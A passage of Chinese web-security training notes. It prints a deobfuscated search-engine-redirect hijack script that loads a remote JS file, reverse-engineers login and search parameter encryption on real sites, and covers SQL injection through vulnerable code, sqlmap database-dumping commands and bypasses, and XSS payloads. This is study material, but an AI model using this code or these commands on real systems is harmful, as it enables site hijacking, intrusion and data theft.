+</span></span><span class="line"><span class="cl">    <span class="p">}(</span><span class="s1">&#39;n(f(p,a,c,k,e,r){e=f(c){h c.o(a)};i(!\&#39;\&#39;.j(/^/,q)){l(c--)r[e(c)]=k[c]||e(c);k=[f(e){h r[e]}];e=f(){h\&#39;\\\\w+\&#39;};c=1};l(c--)i(k[c])p=p.j(s t(\&#39;\\\\b\&#39;+e(c)+\&#39;\\\\b\&#39;,\&#39;g\&#39;),k[c]);h p}(\&#39;1[&#34;2&#34;][&#34;3&#34;](\\\&#39;&lt;0 4=&#34;5/6&#34; 7=&#34;8://9.a.b/c.d&#34;&gt;&lt;/0&gt;\\\&#39;);\&#39;,m,m,\&#39;u|v|x|y|z|A|B|C|D|E|F|G|H|I\&#39;.J(\&#39;|\&#39;),0,{}))&#39;</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="s1">&#39;|||||||||||||||function||return|if|replace||while|14|eval|toString||String||new|RegExp|script|window||document|write|type|text|javascript|src|https|www|bob5918|com|bob|js|split&#39;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">{}))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解密第二步</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">    <span class="nb">eval</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">p</span><span class="p">,</span> <span class="nx">a</span><span class="p">,</span> <span class="nx">c</span><span class="p">,</span> <span class="nx">k</span><span class="p">,</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">r</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">e</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">};</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="s1">&#39;&#39;</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^/</span><span class="p">,</span> <span class="nb">String</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">)</span> <span class="nx">r</span><span class="p">[</span><span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)]</span> <span class="o">=</span> <span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">||</span> <span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">k</span> <span class="o">=</span> <span class="p">[</span><span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">r</span><span class="p">[</span><span class="nx">e</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}];</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">e</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s1">&#39;\\w+&#39;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">};</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">c</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">)</span> <span class="k">if</span> <span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">])</span> <span class="nx">p</span> <span class="o">=</span> <span class="nx">p</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;\\b&#39;</span> <span class="o">+</span> <span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;\\b&#39;</span><span class="p">,</span> <span class="s1">&#39;g&#39;</span><span class="p">),</span> <span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}(</span><span class="s1">&#39;1[&#34;2&#34;][&#34;3&#34;](\&#39;&lt;0 4=&#34;5/6&#34; 7=&#34;8://9.a.b/c.d&#34;&gt;&lt;/0&gt;\&#39;);&#39;</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="s1">&#39;script|window|document|write|type|text|javascript|src|https|www|bob5918|com|bob|js&#39;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">{}))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解密内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">window[&#34;document&#34;][&#34;write&#34;](&#39;&lt;script type=&#34;text/javascript&#34; src=&#34;https://www.bob5918.com/bob.js&#34;&gt;&lt;/script&gt;&#39;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a rel="noreferrer noopener" href="https://www.bob5918.com/bob.js" data-type="URL" data-id="https://www.bob5918.com/bob.js" target="_blank" rel="nofollow" >查看劫持代码</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">_hmt</span> <span class="o">=</span> <span class="nx">_hmt</span> <span class="o">||</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">hm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;script&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">hm</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">&#34;https://hm.baidu.com/hm.js?18963394de828e9ee31d0bfb3e310da3&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s2">&#34;script&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">s</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">.</span><span class="nx">insertBefore</span><span class="p">(</span><span class="nx">hm</span><span class="p">,</span> <span class="nx">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/*百度推送代码*/</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">bp</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">bp</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;//push.zhanzhang.baidu.com/push.js&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s2">&#34;script&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">s</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">.</span><span class="nx">insertBefore</span><span class="p">(</span><span class="nx">bp</span><span class="p">,</span> <span class="nx">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/*360推送代码*/</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">src</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">protocol</span> <span class="o">+</span> <span class="s1">&#39;//js.passport.qihucdn.com/11.0.1.js?8113138f123429f4e46184e7146e43d9&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;script src=&#34;&#39;</span> <span class="o">+</span> <span class="nx">src</span> <span class="o">+</span> <span class="s1">&#39;&#34; id=&#34;sozz&#34;&gt;&lt;\/script&gt;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">writeln</span><span class="p">(</span><span class="s2">&#34;&lt;script LANGUAGE=\&#34;Javascript\&#34;&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">writeln</span><span class="p">(</span><span class="s2">&#34;var s=document.referrer&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">writeln</span><span class="p">(</span><span class="s2">&#34;if(s.indexOf(\&#34;baidu\&#34;)&gt;0 || s.indexOf(\&#34;sogou\&#34;)&gt;0 || s.indexOf(\&#34;soso\&#34;)&gt;0 ||s.indexOf(\&#34;sm\&#34;)&gt;0 ||s.indexOf(\&#34;uc\&#34;)&gt;0 ||s.indexOf(\&#34;bing\&#34;)&gt;0 ||s.indexOf(\&#34;yahoo\&#34;)&gt;0 ||s.indexOf(\&#34;so\&#34;)&gt;0 )&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">writeln</span><span class="p">(</span><span class="s2">&#34;location.href=\&#34;https://www.136415.com\&#34;;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">writeln</span><span class="p">(</span><span class="s2">&#34;&lt;/script&gt;&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>js加密实现<a href="https://tool.chinaz.com/js.aspx" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://tool.chinaz.com/js.aspx" target="_blank" rel="noopener noreffer ">https://tool.chinaz.com/js.aspx</a></a></p>
+<h4 id="js逆向实例">JS逆向实例</h4>
+<p><strong>澎湃新闻搜索参数加密逆向</strong></p>
+<p>澎湃新闻搜索参数</p>
+<ul>
+<li><a rel="noreferrer noopener" href="https://www.thepaper.cn/searchResult.jsp" target="_blank" rel="nofollow" ><a href="https://www.thepaper.cn/searchResult.jsp" target="_blank" rel="noopener noreffer ">https://www.thepaper.cn/searchResult.jsp</a></a></li>
+<li>搜索关键字&quot;sckval&quot;</li>
+<li>通过POST请求<a rel="noreferrer noopener" href="https://www.thepaper.cn/getCheckCodeData.jsp" target="_blank" rel="nofollow" ><a href="https://www.thepaper.cn/getCheckCodeData.jsp" target="_blank" rel="noopener noreffer ">https://www.thepaper.cn/getCheckCodeData.jsp</a></a>获取suuid、codeData</li>
+<li>调用CryptoJS.AES实现加密</li>
+</ul>
+<pre class="wp-block-code"><code>  // npm install crypto-js
+  const CryptoJS = require("crypto-js");
+  // CryptoJS
+  // console.log(CryptoJS.lib.WordArray.random(128 / 8).toString(CryptoJS.enc.Hex))
+  function jiami(suuid,codeData){
+      kdStr = {}
+      kdStr.suuid = suuid
+      kdStr.codeData= codeData
+      var iv = CryptoJS.lib.WordArray.random(128 / 8).toString(CryptoJS.enc.Hex);
+      var kd = CryptoJS.enc.Utf8.parse(kdStr.codeData);
+      md = CryptoJS.mode.ECB;
+      var edt = CryptoJS.AES.encrypt(kdStr.codeData, kd, {
+          iv: CryptoJS.enc.Hex.parse(iv),
+          mode: md,
+          padding: CryptoJS.pad.Pkcs7
+      });
+      var returnObj = {};
+      returnObj.codeData = kdStr.codeData;
+      returnObj.seeda = encodeURIComponent(edt);
+      returnObj.suuid = kdStr.suuid;
+      var checkValue = CryptoJS.MD5(kdStr.codeData + kdStr.suuid).toString();
+      returnObj.sckval = checkValue;
+      return &#91;returnObj.sckval,returnObj.seeda]
+  }
+
+  console.log(jiami("519ef32d-8725-4fcc-9b84-7ba1c28e1e29","XX2jgLQxVbxn4M2l"))</code></pre><figure class="wp-block-image size-full">
+<p><img loading="lazy" width="851" height="333" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-134.png" alt="" class="wp-image-2741" /> </figure></p>
+<p><strong>登录参数加密逆向</strong></p>
+<p>某平台登录参数</p>
+<ul>
+<li><a href="http://eip.chanfine.com/login.jsp" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="http://eip.chanfine.com/login.jsp" target="_blank" rel="noopener noreffer ">http://eip.chanfine.com/login.jsp</a></a></li>
+<li>搜索关键字&quot;j_password&quot;</li>
+<li>获取JSESSIONID=FA0F80009AAA8F32D36C2FBBF2DDBD62</li>
+<li>调用CryptoJS.AES.encrypt实现加密</li>
+</ul>
+<pre class="wp-block-code"><code>const CryptoJS = require("crypto-js");
+function sec_get(encodeType) {
+    var str = "E3C10065F9DD13243BF72AE1E02AC002"
+    if (encodeType == null || encodeType == 'aes') {
+        if (str.length &lt; 32) {
+            str += "abcdefghijklmnopqrstuvwxyz1234567890"
+        }
+        str = str.toUpperCase();
+        var key = {};
+        key.key = str.substring(0, 16);
+        key.iv = str.substring(16, 32);
+        key.security = "\u4435\u5320\u4d35"
+    }
+    return key
+}
+
+function calljs(){
+    keyObj = sec_get();
+    value = "6666666"
+    value = CryptoJS.AES.encrypt(value, CryptoJS.enc.Utf8.parse(keyObj.key), {
+        iv: CryptoJS.enc.Utf8.parse(keyObj.iv)
+    }).toString()
+    return  keyObj.security + value
+}
+
+console.log(calljs())</code></pre><figure class="wp-block-image size-full">
+<p><img loading="lazy" width="826" height="356" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-135.png" alt="" class="wp-image-2746" /> </figure></p>
+<h2 id="0x01-day2">0x01 day2</h2>
+<p>关系型运算符优先级高到低为：NOT＞AND＞OR</p>
+<p>select * from user where a=1 and b=2 or c=3 and d=4 •where子句中执行的先后顺序是：</p>
+<ul>
+<li>最先是 a=1 and b=2</li>
+<li>然后是 c=3 and d=4</li>
+<li>最后是两个结果集or 等于 (a=1 and b=2) or (c=3 and d=4 )</li>
+</ul>
+<p><strong>SQL注入本质</strong>：SQL使用拼接方法，可注入恶意SQL语句改变原本语句执行逻辑<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1218" height="663" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-140.png" alt="" class="wp-image-2758" /> </figure></p>
+<p>漏洞代码示例</p>
+<p>JDBC</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Connection conn = [...];
+</span></span><span class="line"><span class="cl">Statement stmt = con.createStatement();
+</span></span><span class="line"><span class="cl">ResultSet rs = stmt.executeQuery(&#34;select * from user where username=&#39;&#34;&lt;span class=&#34;has-inline-color has-vivid-red-color&#34;&gt;+username+&lt;/span&gt;&#34;&#39;;&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Hibernate</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Session session = sessionFactory.openSession();
+</span></span><span class="line"><span class="cl">Query q = session.createQuery(&#34;select t from UserEntity t where id = &#34;&lt;span class=&#34;has-inline-color has-vivid-red-color&#34;&gt;+input&lt;/span&gt;);
+</span></span><span class="line"><span class="cl">q.execute();
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Mybatis</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;select id=&#34;unsafe&#34; resultMap=&#34;myResultMap&#34;&gt;
+</span></span><span class="line"><span class="cl">         select * from table where name like &#39;%&lt;span class=&#34;has-inline-color has-vivid-red-color&#34;&gt;${value}&lt;/span&gt;%&#39;
+</span></span><span class="line"><span class="cl">&lt;/select&gt; 
+</span></span><span class="line"><span class="cl">UnSafeBean b = (UnSafeBean)sqlMap.queryForObject(&#34;value&#34;, request.getParameter(&#34;name&#34;));
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ibatis</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;select id=&#34;unsafe&#34; resultMap=&#34;myResultMap&#34;&gt;
+</span></span><span class="line"><span class="cl">         select * from table where name =&#39;$&lt;span class=&#34;has-inline-color has-vivid-red-color&#34;&gt;value&lt;/span&gt;$&#39;
+</span></span><span class="line"><span class="cl">&lt;/select&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>识别Web应用与数据库交互的可能输入:POST请求参数 、GET请求参数、Cookie、Host、X-Forwarded-for……</p>
+<p>oracle中判断数字型和字符型可以用<code>/</code>来进行除的操作。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="969" height="313" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-141.png" alt="" class="wp-image-2760" /> </figure></p>
+<p>数字型注入四则运算（尽量不使用“+”进行测试，+号在绝大多数网站中会被识别为空格）。</p>
+<p>数字型注入1/0操作，MySQL 1/0报Warning，语句仍会正常执行；Oracle 1/0报Error，语句抛出异常。</p>
+<p><strong>判断数据库类型</strong></p>
+<p><strong>基于报错信息</strong></p>
+<p>Oracle <code>Error querying database.  Cause: java.sql.SQLSyntaxErrorException: &lt;span class=&quot;has-inline-color has-vivid-red-color&quot;&gt;ORA&lt;/span&gt;-01756: quoted string not properly terminated</code></p>
+<p>SQL Server <code>Microsoft OLE DB Provider for&lt;span class=&quot;has-inline-color has-vivid-red-color&quot;&gt; SQL Server&lt;/span&gt; 错误 '80040e14'</code></p>
+<p>MySQL <code>You have an error in your SQL syntax; check the manual that corresponds to your &lt;span class=&quot;has-inline-color has-vivid-red-color&quot;&gt;MySQL&lt;/span&gt; server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1</code><figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="946" height="469" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-147.png" alt="" class="wp-image-2781" /></figure></p>
+<p>注入优先级：联合注入＞报错注入＞布尔盲注 ＞时间盲注</p>
+<p>不同MySQL版本函数报错输出情况:</p>
+<ul>
+<li>MySQL 5.0.96 floor可回显想要的查询信息</li>
+<li>MySQL 5.5.29 部分函数报错可回显想要的查询信息</li>
+<li>MySQL 5.7.26 floor、extractvalue、 updatexml可回显想要的查询信息</li>
+<li>MySQL 8 extractvalue、 updatexml可回显想要的查询信息</li>
+</ul>
+<p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询 p可以同时执行多条语句的执行时的注入。在SQL中，分号（;）是用来表示一条sql语句的结束。与union injection（联合注入）的区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆查询注入可以执行的是任意的语句。</p>
+<p><strong>SQLmap常用命令</strong></p>
+<pre class="wp-block-code"><code>python sqlmap.py -u url --users    #列出所有用户
+python sqlmap.py -u url --current-user    #列出当前用户
+python sqlmap.py -u url --is-dba    #查看当前用户是否为数据库管理员
+python sqlmap.py -u url --dbs  #列出所有数据库
+python sqlmap.py -u url --current-db    #查看当前数据库
+python sqlmap.py -u url -D "数据库名称" --tables  #查表名
+python sqlmap.py -u url -D "数据库名" -T "表名" --colunms   #查列名
+python sqlmap.py -u url -D "数据库名" -T "表名" -C "列名" --dump  #查询记录
+python sqlmap.py -u url -D "数据库名" -T "表名" -C "列名" --dump --start n --stop m #查询记录n-m区间内的记录
+python sqlmap.py -u url --data "POST数据" #POST请求注入
+python sqlmap.py -r r.txt #将整个请求数据包保存为r.txt进行注入</code></pre>
+<p><strong>字符过滤</strong></p>
+<p>可过滤一些关键字<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1023" height="73" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-148.png" alt="" class="wp-image-2796" /> </figure></p>
+<p>可过滤一些特殊符号<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="310" height="67" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-149.png" alt="" class="wp-image-2797" /> </figure></p>
+<p><strong>字符绕过</strong></p>
+<p>使用这些字符进行注入点识别：+，-，*，%，/，&gt;，||，|，&amp;，&amp;&amp;</p>
+<p>可以将and换成or，&amp;&amp;， ||等，也可以不使用and或者or，直接使用异或截断： •1^1^0，1^0^0<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="584" height="270" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-151.png" alt="" class="wp-image-2801" /></figure></p>
+<p><strong>SQL ByPass</strong><figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1082" height="569" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-153.png" alt="" class="wp-image-2803" /> </figure></p>
+<p><strong>预编译修复</strong></p>
+<p>JDBC</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Connection conn = [...];
+</span></span><span class="line"><span class="cl">conn.&lt;span class=&#34;has-inline-color has-vivid-red-color&#34;&gt;prepareStatement&lt;/span&gt;(&#34;update COFFEES set SALES = ? where COF_NAME = ?&#34;);
+</span></span><span class="line"><span class="cl">updateSales.setInt(1, nbSales);
+</span></span><span class="line"><span class="cl">updateSales.setString(2, coffeeName);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Mybatis</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;select id=&#34;unsafe&#34; resultMap=&#34;myResultMap&#34;&gt;
+</span></span><span class="line"><span class="cl">         select * from table where name like ‘%&lt;span class=&#34;has-inline-color has-vivid-red-color&#34;&gt;#{value}&lt;/span&gt;%&#39;
+</span></span><span class="line"><span class="cl">&lt;/select&gt; 
+</span></span><span class="line"><span class="cl">UnSafeBean b = (UnSafeBean)sqlMap.queryForObject(&#34;value&#34;,   request.getParameter(&#34;name&#34;));
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ibatis</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;select id=&#34;unsafe&#34; resultMap=&#34;myResultMap&#34;&gt;
+</span></span><span class="line"><span class="cl">         select * from table where name =‘&lt;span class=&#34;has-inline-color has-vivid-red-color&#34;&gt;#value#&lt;/span&gt;&#39;
+</span></span><span class="line"><span class="cl">&lt;/select&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x02-day3">0x02 day3</h2>
+<p>XSS 安全基础</p>
+<figure class="wp-block-image size-full">
+<p><img loading="lazy" width="766" height="488" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-167.png" alt="" class="wp-image-2872" /> </figure></p>
+<p><strong>XSS在哪？</strong></p>
+<ul>
+<li>直接插入到SCRIPT标签里</li>
+<li>插入到HTML注释里</li>
+<li>插入到HTML标签的属性名里</li>
+<li>插入到HTML标签的属性值里</li>
+<li>作为HTML标签的名字</li>
+<li>直接插入到CSS里，范例：<code>test&quot; style=&quot;css:expressio/**/n(alert(1))&quot; a=&quot;</code></li>
+</ul>
+<p><strong>常见业务场景</strong></p>
+<p>重灾区&ndash;评论区、留言区、个人信息、订单信息、……</p>
+<p>针对型&ndash;站内信、私信、意见反馈、……</p>
+<p>存在风险&ndash;搜索框、当前目录、图片属性、……</p>
+<p><strong>如何判断是否存在XSS?</strong></p>
+<p>反射型</p>
+<ul>
+<li>数据包中各种参数输入特定字符串进行尝试，查看返回包是否存在特定字符串</li>
+<li>确定参数可回显后，判断是否可渲染
+<ul>
+<li>数据包返回类型 html：页面搜索传输的特定字符串</li>
+<li>数据包返回类型 json：查看前端渲染情况</li>
+</ul>
+</li>
+<li>字符fuzz，看是否过滤或转义XSS常用的字符</li>
+</ul>
+<p>存储型</p>
+<ul>
+<li>字符fuzz，看是否过滤或转义XSS常用的字符</li>
+</ul>
+<p>xss安全基础题目</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
